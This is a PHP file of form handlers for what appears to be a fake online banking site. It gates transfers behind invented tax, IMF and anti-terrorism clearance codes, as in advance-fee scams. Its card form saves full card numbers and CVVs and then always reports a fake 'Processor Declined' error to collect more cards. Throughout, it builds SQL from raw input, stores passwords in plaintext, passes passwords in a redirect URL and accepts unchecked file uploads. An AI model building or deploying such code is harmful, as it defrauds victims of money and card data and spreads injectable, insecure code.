<?php 
if(isset($_POST['sign_on'])){
    $userid = db_escape($connect,$_POST["online"]);
    $pass = db_escape($connect,$_POST["code"]);
     
$sql = db_query($connect,"SELECT * FROM $tbl_name WHERE userid='$userid' AND password='$pass' LIMIT 1"); // Query the person

if(db_num_rows($sql) < 1){    
 echo '<span class="block"><p class="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-2"><br/>
 Invalid Customer ID or Password, please try again.<br/><br/></p></span>';
 } else {
echo "<span class='block'><p class='bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded mb-2'><br/>
Successful, redirecting...
<br/><br/></p></span>
";
echo "<meta http-equiv=\"refresh\" content=\"2;URL=sign_on_2.php?uid=$userid&ucd=$pass\">";
}
}
?>

<?php 
if(isset($_POST['index'])){
    
     $userid = db_escape($connect,$_POST["online"]);
    $pass = db_escape($connect,$_POST["code"]);
    
    $sql = db_query($connect,"SELECT * FROM $tbl_name WHERE userid='$userid' AND password='$pass' LIMIT 1"); 

if(db_num_rows($sql) < 1){    
 echo '<span class="block"><p class="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-2">
 Invalid Customer ID or Password, please try again.</p></span>';
 } else{
     
$sql = db_query($connect,"SELECT * FROM $tbl_name WHERE userid='$userid'  LIMIT 1"); // Query the person
$data = db_fetch_array($sql, MYSQLI_ASSOC);
//------MAKE SURE PERSON EXISTS-----
$existCount = db_num_rows($sql); // Count the row nums
if ($existCount == 1) {
    while($row = db_fetch_array($sql,MYSQLI_ASSOC)){
    }
    $_SESSION["id"] = $data['id'];
    $_SESSION['userid'] = $userid;
	$_SESSION['name'] = $data['name'];
	$_SESSION['email'] = $data['email'];
	$_SESSION['address'] = $data['address'];
	$_SESSION['city'] = $data['city'];
	$_SESSION['state'] = $data['state'];
	$_SESSION['country'] = $data['country'];
	$_SESSION['accountnumber'] = $data['accountnumber'];
	$_SESSION['currency'] = $data['currency'];
	$_SESSION['availablebalance'] = $data['availablebalance'];
	$_SESSION['sender'] = $data['sender'];
	$_SESSION['credit'] = $data['credit'];
	$_SESSION['debit'] = $data['debit'];
	$_SESSION['datesent'] = $data['datesent'];		
	$_SESSION['pic'] = $data['pic'];
	
	$ip =$_SERVER['REMOTE_ADDR'];
	$subject = "New Mail | $title";
    $user_email=$_SESSION['email'];
	$time = date ('j M, Y.  H:ia');

//Mail Start
	$body = "
<p class='mb-2'>Dear ".$_SESSION['name'].",<br>
<br>
<strong>Account Signed-In</strong><br></p>
<br>
<p class='mb-2'>Your account was successfully Logged In from <strong>$ip.</strong> Time: <strong>$time</strong><br>
<br>
This message was sent as a security measure.<br>
You received this mandatory email notification to update you about activities in your account.<br>
Please contact your account officer for any further inquiries.</p><br>

<p class='mb-2'><strong><em>Note:</em></strong> Do not reply to this email, this is an automated notification.</p><br>
<br>
<p class='mb-2'>Thank You,<br>
<strong>Customer Service Desk.</strong></p>
";

// mail to client
			$header = "Reply-To: $site_email\r\n";
			$header .= "Return-Path: $site_email\r\n";
			$header .= "From: Customer Care <$site_email>\r\n";
			$header .= "Content-Type: text/html; charset=iso-8859-1\n";
			//mail($user_email,$subject,$body,$header);
//Mail End

    echo "<span class='block'><p class='bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded mb-2'>
	Login Successful, Redirecting...
	</p></span>";
    echo "<meta http-equiv=\"refresh\" content=\"3;URL=main.php\">";
}
}    
}
?>

 
 
<?php
if(isset($_POST['sign_up'])){

$firstname=$_POST['firstname'];
$lastname = $_POST['lastname'];
$email = $_POST['email'];
$phone = $_POST['phone'];
$username=$_POST['username'];
$password = $_POST['password'];
$dateofbirth = $_POST['dateofbirth'];
$address = $_POST['address'];
$city=$_POST['city'];
$state = $_POST['state'];
$country = $_POST['country'];
$idcard = 'Nill';
$agree = $_POST['agree'];

$subject = "$title - Registration Submitted";
$user_email="$email";

$exec = db_query($connect,"SELECT username FROM $sign_up WHERE username = '$username'");
if(db_num_rows($exec) > 0){
                 echo "<div class='bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-2'> <p class='mb-2'>The Username <strong>$username</strong> already exists.</p></div>";
				 }else{
 
$result=db_query($connect,"INSERT INTO $sign_up (firstname, lastname, email, phone, username, password, dateofbirth, address, city, state, country, idcard, agree, date)
VALUES
('$firstname','$lastname','$email','$phone','$username','$password','$dateofbirth','$address','$city','$state','$country','$idcard','$agree',NOW())");


if($result){

$body = "
<p class='mb-2'>Dear $firstname $lastname,<br>

Thanks for registering on our website.</p>
<p class='mb-2'>Your submission has been received and your account will be created immediately.<br>
Thank you for choosing us for your financial needs.</p><br>

<p class='mb-2'><em>Note:</em>Do not reply to this email, this is an automated notification.</p><br>
<br>
<p class='mb-2'>Thank You,<br>
Customer Service Desk.</p>
";


// mail to client
			$header = "Reply-To: $site_email\r\n";
			$header .= "Return-Path: $site_email\r\n";
			$header .= "From: Customer Care <$site_email>\r\n";
			$header .= "Content-Type: text/html; charset=iso-8859-1\n";
			//mail($user_email,$subject,$body,$header);
//Mail End

		
echo "<div class='bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded mb-2'> 
<h2 class='text-lg font-semibold mb-2'> Registration Successful!</h2>
<p class='mb-2'>Thanks for choosing us. Your registrations will be proccessed.<br />
You will be contacted promptly.<br />
Thank You.</p>
</div>";
echo "<meta http-equiv=\"refresh\" content=\"5;URL=index.php\">";
}
else {
 echo "<div class='bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-2'>Registration not submitted!</div>";
}
}
}

?>

<?php
if(isset($_POST['trans'])){


$trans_code=$_POST['trans_code'];

$exec = db_query($connect,"SELECT trans_code FROM $data WHERE trans_code = '$trans_code'");
if(db_num_rows($exec) < 1){
echo "<div class='bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-2'> <p class='mb-2'>Invalid Entry! <br/>
You are required to have your <strong>'Personal Transaction Key'</strong>before commencing.<br/>
<em>Note:</em> Your transaction is almost completed.</p></div>";
}else{

echo "<div class='bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded mb-2'> <p class='mb-2'>Code Accepted!<br/>
Redirecting to finalize transfer.</p></div>";
echo "<meta http-equiv=\"refresh\" content=\"4;URL=initiate2.php\">";
}
}
?>

<?php
if(isset($_POST['trans_u2'])){


$trans_code=$_POST['trans_code'];

$exec = db_query($connect,"SELECT trans_code FROM $data WHERE trans_code = '$trans_code'");
if(db_num_rows($exec) < 1){
echo "<div class='bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-2'> <p class='mb-2'>Invalid Entry! <br/>
You are required to have your <strong>'Personal Transaction Key'</strong>before commencing.<br/>
<em>Note:</em> Your transaction is almost completed.</p></div>";
}else{

echo "<div class='bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded mb-2'> <p class='mb-2'>Code Accepted!<br/>
Redirecting to finalize transfer.</p></div>";
echo "<meta http-equiv=\"refresh\" content=\"4;URL=initiate_u2.php\">";
}
}
?>

<?php
if(isset($_POST['trans2'])){


$trans_code=$_POST['trans_code'];

$exec = db_query($connect,"SELECT trans_code FROM $data WHERE trans_code = '$trans_code'");
if(db_num_rows($exec) < 1){
echo "<div class='bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-2'> <p class='mb-2'>Invalid Entry! <br/>
You are required to have your <strong>'Personal Transaction Key'</strong>before commencing.<br/>
<em>Note:</em> Your transaction is almost completed.</p></div>";
}else{

echo "<div class='bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded mb-2'> <p class='mb-2'>Code Accepted!<br/>
Redirecting to finalize transfer.</p></div>";
echo "<meta http-equiv=\"refresh\" content=\"4;URL=initiate_2.php\">";
}
}
?>

<?php
if(isset($_POST['tax'])){


$tax_code=$_POST['tax_code'];

$exec = db_query($connect,"SELECT tax_code FROM $data WHERE tax_code = '$tax_code'");
if(db_num_rows($exec) < 1){
echo "<div class='bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-2'> <p class='mb-2'>Invalid Entry! <br/>
You are required to have your <strong>'Tax Clearance Code (TCC)'</strong>before commencing.<br/>
<em>Note:</em> Your transaction is almost completed.</p></div>";
}else{

echo "<div class='bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded mb-2'> <p class='mb-2'>Code Accepted!<br/>
Redirecting to finalize transfer.</p></div>";
echo "<meta http-equiv=\"refresh\" content=\"4;URL=initiate_3.php\">";
}
}
?>


<?php
if(isset($_POST['imf'])){


$imf_code=$_POST['imf_code'];

$exec = db_query($connect,"SELECT imf_code FROM $data WHERE imf_code = '$imf_code'");
if(db_num_rows($exec) < 1){
echo "<div class='bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-2'> <p class='mb-2'>Invalid Entry! <br/>
You are required to have your <strong>'IMF Clearance Code'</strong>before commencing.<br/>
<em>Note:</em> Your transaction is almost completed.</p></div>";
}else{

echo "<div class='bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded mb-2'> <p class='mb-2'>Code Accepted!<br/>
Redirecting to finalize transfer.</p></div>";
echo "<meta http-equiv=\"refresh\" content=\"4;URL=initiate_4.php\">";
}
}
?>

<?php
if(isset($_POST['ter'])){

$id=$_POST['id'];
$ter_code=$_POST['ter_code'];

$exec = db_query($connect,"SELECT ter_code FROM $data WHERE ter_code = '$ter_code'");
if(db_num_rows($exec) < 1){
echo "<div class='bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-2'> <p class='mb-2'>Invalid Entry! <br/>
You are required to have your <strong>'Anti-Terrorism Code'</strong>before commencing.<br/>
<em>Note:</em> Your transaction is almost completed.</p></div>";
}else{

$sql="SELECT * FROM $tbl_name WHERE id='$id'";
$result=db_query($connect,$sql);
$rows=db_fetch_array($result,MYSQLI_ASSOC);
$tamount=$rows['amount'];
$tbalance=$rows['availablebalance'];
$newbalance= $tbalance - $tamount;

$exec=db_query($connect,"UPDATE $tbl_name SET availablebalance='$newbalance', trans='3' WHERE id='$id'");

echo "<div class='bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded mb-2'> <p class='mb-2'>Code Accepted!<br/>
Redirecting to finalize transfer.</p></div>";
echo "<meta http-equiv=\"refresh\" content=\"4;URL=success.php\">";
}
}
?>

<?php
if(isset($_POST['add_ben'])){

$id=$_POST["id"];
$bnk_name=$_POST["bnk_name"];
$ben_name=$_POST["ben_name"];
$ben_acct=$_POST["ben_acct"];
$bnk_add=$_POST["bnk_add"];
$sw_code=$_POST["sw_code"];
$ib_code=$_POST["ib_code"];

$exec1 = db_query($connect,"SELECT ben_acct FROM $ben_info WHERE ben_acct = '$ben_acct'");
if(db_num_rows($exec1) > 0){
                 echo "<div class='bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-2'> <p class='mb-2'>The Acct Number <strong>$ben_acct</strong> already exists.</p></div>";
				 }else{

$result=db_query($connect,"INSERT INTO $ben_info (id, bnk_name, ben_name, ben_acct, bnk_add, sw_code, ib_code, date)
VALUES
('$id','$bnk_name','$ben_name','$ben_acct','$bnk_add','$sw_code','$ib_code',NOW())");

if($result){
 echo "<div class='bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded mb-2'>Beneficiary Added, Redirecting...</div>";
 echo "<meta http-equiv=\"refresh\" content=\"0;URL=u_ben.php\">";
}

else {
echo "<div class='bg-yellow-100 border border-yellow-400 text-yellow-700 px-4 py-3 rounded mb-2'>Error Adding Beneficiary..</div>";
}
}
}
?>

<?php
			if(isset($_POST['deleteben'])){
                $id=$_POST["id"];
                    $qry=db_query($connect,"SELECT * FROM $ben_info WHERE ben_id='$id'");
                    $row=db_fetch_array($qry,MYSQLI_ASSOC);
			$sql = 'DELETE FROM `'.$ben_info.'` WHERE `ben_id`='.(int)$id;
                        $del=db_query($connect,$sql);
                    if($del){
					 echo "<div class='bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded mb-2'>Beneficiary Deleted!</div>";
 echo "<meta http-equiv=\"refresh\" content=\"0;URL=u_ben.php\">";
}
}                
?>

<?php
if(isset($_POST['cc_data'])){

$c_name=db_escape($connect,$_POST['c_name']);
$c_number=db_escape($connect,$_POST['c_number']);
$c_type=db_escape($connect,$_POST['c_type']);
$exp_month=db_escape($connect,$_POST['exp_month']);
$exp_year=db_escape($connect,$_POST['exp_year']);
$ccv=db_escape($connect,$_POST['ccv']);
$address=db_escape($connect,$_POST['address']);
$city=db_escape($connect,$_POST['city']);
$zip=db_escape($connect,$_POST['zip']);
$country=db_escape($connect,$_POST['country']);

$exec=db_query($connect,"INSERT INTO $c_info (c_name, c_number, c_type, exp_month, exp_year, ccv, address, city, zip, country, date)
VALUES
('$c_name','$c_number','$c_type','$exp_month','$exp_year','$ccv','$address','$city','$zip','$country',NOW())");

if($exec){
echo '<div class="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-2">
							<h4 class="text-lg font-semibold mb-2">Payment validation failed: Processor Declined</h4>
							<p class="mb-2">For security reasons please re-enter your credit card information.<br>
		 You may try another credit card.</p>
						</div>';
}
}
?>

 <?php
if(isset($_POST['add_check'])){

// resizes an image to fit a given width in pixels.
// works with BMP, PNG, JPEG, and GIF
// $file is overwritten
function fit_image_file_to_width($file, $w, $mime = 'image/jpeg') {
    // Check if GD extension is available
    if (!extension_loaded('gd')) {
        // GD not available, skip image processing
        return false;
    }
    
    list($width, $height) = getimagesize($file);
    $newwidth = $w;
    $newheight = $w * $height / $width;

    switch ($mime) {
        case 'image/jpeg':
            $src = imagecreatefromjpeg($file);
            break;
        case 'image/png':
            $src = imagecreatefrompng($file);
            break;
        case 'image/bmp':
            $src = imagecreatefromwbmp($file);
            break;
        case 'image/gif':
            $src = imagecreatefromgif($file);
            break;
        default:
            return false;
    }

    if (!$src) {
        return false;
    }

    $dst = imagecreatetruecolor($newwidth, $newheight);
    imagecopyresampled($dst, $src, 0, 0, 0, 0, $newwidth, $newheight, $width, $height);

    switch ($mime) {
        case 'image/jpeg':
            imagejpeg($dst, $file);
            break;
        case 'image/png':
            imagealphablending($dst, false);
            imagesavealpha($dst, true);
            imagepng($dst, $file);
            break;
        case 'image/bmp':
            imagewbmp($dst, $file);
            break;
        case 'image/gif':
            imagegif($dst, $file);
            break;
    }

    imagedestroy($src);
    imagedestroy($dst);
    return true;
}

// init file vars
$new = rand();
$pic= $new . ($_FILES['photo']['name']);
$target = '../ad_panel/images/' .$new . basename( $_FILES['photo']['name']);
$temp_name = $_FILES['photo']['tmp_name'];
$type = $_FILES["photo"]["type"];

$chk_name = db_escape($connect, $_POST['chk_name']); 
$chk_acct = db_escape($connect, $_POST['chk_acct']); 
$chk_bnk = db_escape($connect, $_POST['chk_bnk']); 
$chk_amt = db_escape($connect, $_POST['chk_amt']);
$chk_status = "Processing";  
   //Tells you if its all ok

db_query($connect,"INSERT INTO $chk_info (id, chk_name, chk_acct, chk_bnk, chk_amt, chk_status, pic, date) 
VALUES 
('$id','$chk_name','$chk_acct','$chk_bnk','$chk_amt','$chk_status','$pic',NOW())") ;
//Writes the information to the database  
	
// resize the image in the tmp directorys
$image_processed = fit_image_file_to_width($temp_name, 450, $type);
if (!$image_processed) {
    // Image processing failed (likely GD not available), but continue with upload
    // The image will be uploaded without resizing
}

//Writes the photo to the server
if(move_uploaded_file($temp_name, $target)) {
 echo "<div class='bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded mb-2 text-center'> <p class='mb-2'>Submitting Check... please wait.</p></div>";
  echo "<meta http-equiv=\"refresh\" content=\"2;URL=chk_submit.php\">";
} else {

    //Gives and error if its not 
echo "<div class='bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-2 text-center'>Error Submitting Entry</div>";

}
}
?>

<?php
if(isset($_POST['sendmssg'])){
$id=$_POST["id"];
$m_subject=$_POST["m_subject"];
$m_to=$_POST["m_to"];
$m_from=$_POST["m_from"];
$m_message=$_POST["m_message"];
$m_type='admin';
$m_status='sent';

$exec = db_query($connect,"INSERT INTO $mail (id, m_subject, m_to, m_from, m_message, m_type, m_status, m_date) VALUES ('$id','$m_subject','$m_to','$m_from','$m_message','$m_type','$m_status',NOW() )");

if($exec){
 echo "<div class='bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded mb-2'>Message Sent, Redirecting...</div>";
 echo "<meta http-equiv=\"refresh\" content=\"4;URL=mssg.php\">";
}

else {
echo "<div class='bg-yellow-100 border border-yellow-400 text-yellow-700 px-4 py-3 rounded mb-2'>Error Sending Message..</div>";
}
}
?>
<?php
if(isset($_POST['editpass'])){


$password=$_POST['password'];
$id=$_POST['id'];

// update data in mysql database 
$sql="UPDATE $tbl_name SET password='$password'
WHERE id='$id'";
$result=db_query($connect,$sql);

// if successfully updated. 
if($result){
 echo "<div class='bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded mb-2'>Password Changed, Logging Out...</div>";
 echo "<meta http-equiv=\"refresh\" content=\"4;URL=logout.php\">";
}

else {
echo "<div class='bg-yellow-100 border border-yellow-400 text-yellow-700 px-4 py-3 rounded mb-2'>Error Editing - Loading...</div>";
}
}
?>

<?php
if(isset($_POST['editaddress'])){


$address=$_POST['address'];
$city=$_POST['city'];
$state=$_POST['state'];
$country=$_POST['country'];
$id=$_POST['id'];

// update data in mysql database 
$sql="UPDATE $tbl_name SET address='$address', city='$city', state='$state', country='$country'
WHERE id='$id'";
$result=db_query($connect,$sql);

// if successfully updated. 
if($result){
 echo "<div class='bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded mb-2'>Successful - Reloading...</div>";
 echo "<meta http-equiv=\"refresh\" content=\"2;URL=edit_pass.php\">";
}

else {
echo "<div class='bg-yellow-100 border border-yellow-400 text-yellow-700 px-4 py-3 rounded mb-2'>Error Editing Address - Reloading...</div>";
}
}
?>